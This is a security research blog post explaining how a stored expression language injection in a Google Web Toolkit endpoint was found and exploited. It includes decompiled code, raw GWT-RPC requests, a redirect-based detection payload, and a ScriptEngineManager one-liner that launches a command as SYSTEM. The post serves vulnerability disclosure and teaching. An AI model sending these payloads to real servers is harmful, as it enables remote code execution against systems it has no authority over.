---
layout: post
title: "From Serialized to Shell :: Exploiting Google Web Toolkit with EL Injection"
date: 2017-05-22 12:00:00 -0600
categories: blog
excerpt_separator: <!--more-->
---

<img class="excel" alt="Google Web Toolkit" src="/assets/images/gwt.png">
<p class="cn" markdown="1">This is a follow up blog post to my <a class="prev" href="{{page.previous.url}}">previous post</a> on auditing Google Web Toolkit (GWT). Today we are going to focus on a specific vulnerability that I found in a GWT endpoint that [Matthias Kaiser](https://twitter.com/matthias_kaiser) helped me exploit. Please note that the code has been changed to protect the not so innocent whilst they patch.</p>

<!--more-->

<p class="cn" markdown="1">TL;DR</p>

<p class="cn" markdown="1">I explain a semi-complex expression language injection vulnerability which is triggered in a Google Web Toolkit (GWT) endpoint.</p>

### The vulnerability

<p class="cn" markdown="1">Within the WEB-INF/web.xml file, I found the following endpoint mapping:</p>

{% highlight xml %}
<servlet>
    <servlet-name>someService</servlet-name>
    <servlet-class>com.aaa.bbb.ccc.ddd.server.SomeServiceImpl</servlet-class>
</servlet>

<servlet-mapping>
    <servlet-name>someService</servlet-name>
    <url-pattern>/someService.gwtsvc</url-pattern>
</servlet-mapping>
{% endhighlight %}

<p class="cn" markdown="1">We can see that the above code references the server mapping. Since GWT works by defining client classes that denote which methods are available for the client to access, let's start by looking at the corresponding client class com.aaa.bbb.ccc.ddd.**client**.SomeService:</p>

{% highlight java %}

public abstract interface SomeService
  extends RemoteService
{
  public abstract void sendBeanName(String paramString);
  
  public abstract Boolean setMibNodesInfo(List<MIBNodeModel> paramList);
  
  public abstract void createMibNodeGettingBean();
}
{% endhighlight %}

There are three functions that look interesting that we can reach, lets strip them out of the server code and see what each one does. Reading the Java code in the main jar archive that contains the class SomeServiceImpl we find the following code:

{% highlight java %}
  public void sendBeanName(String paramString)
  {
    if (paramString == null) {
      return;
    }
    HttpSession localHttpSession = super.getThreadLocalRequest().getSession();
    if (localHttpSession != null) {
      localHttpSession.setAttribute("MibWidgetBeanName", paramString);
    }
  }
{% endhighlight %}

<p class="cn" markdown="1">Ok, so we can set a session attribute named **MibWidgetBeanName** with a string we can control. So far, nothing interesting. Let's investigate the **setMibNodesInfo** function:</p>

{% highlight java %}
  public Boolean setMibNodesInfo(List<MIBNodeModel> paramList)
  {
    List localList = ModelUtil.mibNodeModelList2MibNodeList(paramList);
    if (localList != null)
    {
      MibNodesSelect localMibNodesSelect = getBeanByName();
{% endhighlight %}

<p class="cn" markdown="1">This function accepts a **List** type using a complex type **MIBNodeModel**. The **mibNodeModelList2MibNodeList** function will check to see if what we supplied was a valid List and return different strings based on what values are contained within the first element of the List.</p>

<p class="cn" markdown="1">If there are no values supplied in the our List, it will define a List and return it with a default instances of **MIBNodeModel**. Then, the **getBeanByName** function is callled. Let's go ahead and investigate this function.</p>

{% highlight java hl_lines="8 9 14" %}
  private MibNodesSelect getBeanByName()
  {
    ...

    Object localObject1 = super.getThreadLocalRequest().getSession();
    if (localObject1 != null)
    {
      localObject2 = (String)((HttpSession)localObject1).getAttribute("MibWidgetBeanName");
      if (localObject2 != null)
      {
        localObject3 = null;
        try
        {
          localObject3 = (MibNodesSelect)FacesUtils.getValueExpressionObject(localFacesContext, "#{" + (String)localObject2 + "}");
        }
        finally
        {
          if ((localFacesContext != null) && (i != 0)) {
            localFacesContext.release();
          }
        }
        return (MibNodesSelect)localObject3;
      }
    }
    return null;
  }
{% endhighlight %}

<p class="cn" markdown="1">Since this is a private method, it's not reachable via the client interface and we cannot call it directly. We can see on line 8 that we get that attribute **MibWidgetBeanName** again and store it into a string called **localObject2**.</p>

<p class="cn" markdown="1">This **localObject2** variable is later used on line 14 for retrieving an expression. Classic expression injection vulnerability. Well, not so classic, but somewhat obvious after decompiling the code.</p>

### Exploitation

<p class="cn" markdown="1">First of all, the observing reader will notice that this is not a *reflective* type of expression language injection. Meaning you cannot view the results of code executing to verify the vulnerability. Thus, I clasify it as a *blind expression language injection vulnerability*.</p>

<p class="cn" markdown="1">I digress by demonstrating an example. Suppose we have a vulnerability in a Java Servlet Faces (JSF) application that looks like so:</p>

{% highlight java %}
<h:outputText value="${beanEL.ELAsString(request.getParameter('expression'))}" /> 
{% endhighlight %}

<p class="cn" markdown="1">An attacker could simply perform the following request:</p>

<p class="cn" markdown="1">**http://[target]/some_endpoint/vuln.jsf?expression=9%3b1**</p>

<p class="cn" markdown="1">Since a browser translates the + as a space, we encode the + so that what we are really sending is 9+1 and upon server response, if we see a value of 10 then we know that we have an expression language injection vulnerability since the math operation executed. This is the method Burp Suite uses to detect template injection vulnerabilities.</p>

<p class="cn" markdown="1">However, given our vulnerable code above, we cannot *easily* determine an expression language injection vulnerability, or could we? After experimenting with the JSF api I found some very neat functions that allow us to fully determine the presence of a EL Injection vulnerability without making outgoing HTTP requests.</p>

<p class="cn" markdown="1">The oracle documentation states that you can use the [**getExternalContext**](https://docs.oracle.com/cd/E17802_01/j2ee/j2ee/javaserverfaces/1.2/docs/api/javax/faces/context/FacesContext.html#getExternalContext()) method on the FacesContext instance. This method returns a **ExternalContext** type which can allow us to set specific reponse object properties. When I was investigating this, two functions came to mind:</p>

<div class="cn" markdown="1">
* [setResponseCharacterEncoding](https://docs.oracle.com/cd/E17802_01/j2ee/j2ee/javaserverfaces/1.2/docs/api/javax/faces/context/ExternalContext.html#setResponseCharacterEncoding(java.lang.String))
* [redirect](https://docs.oracle.com/cd/E17802_01/j2ee/j2ee/javaserverfaces/1.2/docs/api/javax/faces/context/ExternalContext.html#redirect(java.lang.String))
</div>

<p class="cn" markdown="1">Therefore, we could set the string to the following Java code:</p>

{% highlight java %}
facesContext.getExternalContext().redirect("https://srcincite.io/");
{% endhighlight %}

<p class="cn" markdown="1">...and if the response was a 302 redirect to **https://srcincite.io/** then we can confirm the code is vulnerable.</p>

#### Testing the vulnerability

<p class="cn" markdown="1">The first request we need to do is to set the session attribute **MibWidgetBeanName**</p>

{% highlight text %}
POST /someService.gwtsvc HTTP/1.1
Host: [target]
Accept: */*
X-GWT-Module-Base: 
X-GWT-Permutation: 
Cookie: JSESSIONID=[cookie]
Content-Type: text/x-gwt-rpc; charset=UTF-8
Content-Length: 195

6|0|6||45D7850B2B5DB917E4D184D52329B5D9|com.aaa.bbb.ccc.ddd.client.SomeService|sendBeanName|java.lang.String|facesContext.getExternalContext().redirect("https://srcincite.io/")|1|2|3|4|1|5|6|
{% endhighlight %}

<p class="cn" markdown="1">With a server response of **//OK[[],0,6]** we know that our GWT injection was successful. Then, the second request to trigger the *stored* in a session string, expression language injection. However, before we send that request, since we are using complex types for the **setMibNodesInfo** function, we need to look up the policy file that defines the available types allowed to send. Within the **[strong name].gwt.rpc** file, I found the following type value for ArrayList: **java.util.ArrayList/382197682**.</p>

<p class="cn" markdown="1">Now we can go ahead and use that type in the request:</p>

{% highlight text %}
POST /someService.gwtsvc HTTP/1.1
Host: [target]
Accept: */*
X-GWT-Module-Base: 
X-GWT-Permutation: 
Cookie: JSESSIONID=[cookie]
Content-Type: text/x-gwt-rpc; charset=UTF-8
Content-Length: 171

6|0|6||45D7850B2B5DB917E4D184D52329B5D9|com.aaa.bbb.ccc.ddd.client.SomeService|setMibNodesInfo|java.util.List|java.util.ArrayList/3821976829|1|2|3|4|1|5|6|0|
{% endhighlight %}

<p class="cn" markdown="1">The corresponding response, looks like this:</p>

{% highlight text %}
HTTP/1.1 302 Found
Server: Apache-Coyote/1.1
Set-Cookie: JSESSIONID=[cookie]; Path=/; Secure; HttpOnly
Set-Cookie: oam.Flash.RENDERMAP.TOKEN=-g9lc30a8l; Path=/; Secure
Pragma: no-cache
Cache-Control: no-cache
Expires: Thu, 01 Jan 1970 00:00:00 GMT
Pragma: no-cache
Location: https://srcincite.io/
Content-Type: text/html;charset=UTF-8
Content-Length: 45
Date: Wed, 03 May 2017 18:58:36 GMT
Connection: close

//OK[0,1,["java.lang.Boolean/476441737"],0,6]
{% endhighlight %}

<p class="cn" markdown="1">Of course, redirection is great and all for vulnerability detection, but we want shells. After reading Minded Securities excellent [blog post](http://blog.mindedsecurity.com/2015/11/reliable-os-shell-with-el-expression.html) I discovered that I can use the **ScriptEngineManager**'s JavaScript engine to dynamically evaluate Java code. Their one-liner was a bit long for me, so I created one that works using the same technique.</p>

{% highlight java %}
"".getClass().forName("javax.script.ScriptEngineManager").newInstance().getEngineByName("JavaScript").eval("var proc=new java.lang.ProcessBuilder[\\"(java.lang.String[])\\"]([\\"cmd.exe\\",\\"/c\\",\\"calc.exe\\"]).start();")
{% endhighlight %}

<p class="cn" markdown="1">Updating the **MibWidgetBeanName** session attribute with that code and re-triggering the **setMibNodesInfo** function, launches commands as SYSTEM against my target:</p>

{% highlight text %}
POST /someService.gwtsvc HTTP/1.1
Host: [target]
Accept: */*
X-GWT-Module-Base: 
X-GWT-Permutation: 
Cookie: JSESSIONID=[cookie]
Content-Type: text/x-gwt-rpc; charset=UTF-8
Content-Length: 366

6|0|6||45D7850B2B5DB917E4D184D52329B5D9|com.aaa.bbb.ccc.ddd.client.SomeService|sendBeanName|java.lang.String|"".getClass().forName("javax.script.ScriptEngineManager").newInstance().getEngineByName("JavaScript").eval("var proc=new java.lang.ProcessBuilder[\\"(java.lang.String[])\\"]([\\"cmd.exe\\",\\"/c\\",\\"calc.exe\\"]).start();")|1|2|3|4|1|5|6|
{% endhighlight %}

<p class="cn" markdown="1">Onto triggering the expression language injection...</p>

{% highlight text %}
POST /someService.gwtsvc HTTP/1.1
Host: [target]
Accept: */*
X-GWT-Module-Base: 
X-GWT-Permutation: 
Cookie: JSESSIONID=[cookie]
Content-Type: text/x-gwt-rpc; charset=UTF-8
Content-Length: 171

6|0|6||45D7850B2B5DB917E4D184D52329B5D9|com.aaa.bbb.ccc.ddd.client.SomeService|setMibNodesInfo|java.util.List|java.util.ArrayList/3821976829|1|2|3|4|1|5|6|0|
{% endhighlight %}

<img alt="SYSTEM calc" src="/assets/images/gwt_calc.png">

### Conclusion

<p class="cn" markdown="1">There is *almost* no way this vulnerability would have been discovered from a black-box perspective. Common tools such as Burp Suite have no chance of currently detecting such vulnerabilities especially considering this particular case where the string is stored in a session attribute.</p>

<p class="cn" markdown="1">As web technologies progress forward, our need for automation increases and a lack of tools, skills and knowledge in this area allows many applications to stay vulnerable to critical code execution vulnerabilities for years.</p>
